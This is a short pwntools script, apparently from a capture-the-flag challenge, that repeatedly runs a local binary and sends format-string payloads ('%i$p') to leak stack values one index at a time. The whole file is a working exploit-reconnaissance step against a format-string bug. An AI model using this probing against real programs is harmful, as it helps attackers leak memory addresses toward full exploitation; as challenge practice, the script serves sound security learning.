from pwn import *

context.log_level = 'error'

exe = context.binary = ELF('./chal', checksec=False)
libc = exe.libc

for i in range(1, 100):
    p = process()
    p.sendlineafter(b'Sea of Tranquility!\n', f'%{i}$p'.encode())

    leak_raw = p.recvline().strip()
    if leak_raw:
        print(f"{i} -> {leak_raw.decode(errors='ignore')}")

    p.close()
